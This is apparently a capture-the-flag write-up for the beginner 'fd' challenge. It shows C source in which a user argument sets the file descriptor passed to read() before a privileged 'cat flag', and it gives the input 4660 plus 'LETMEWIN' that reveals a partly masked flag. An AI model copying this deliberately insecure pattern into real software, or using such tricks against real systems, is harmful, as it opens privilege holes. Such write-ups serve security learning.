## fd ##

Challange:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		setregid(getegid(), getegid());
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

Solution:

We found that we can manipulate the fd (file descriptor) variable used in read operation, we can redirect the fd to stdin (id for stdin is 0), and write the "LETMEWIN" string in buf. In this case the fd value equal to first argument - 0x1234 (4660).


```
fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
Mama! Now_I_xxxxxxxx
```
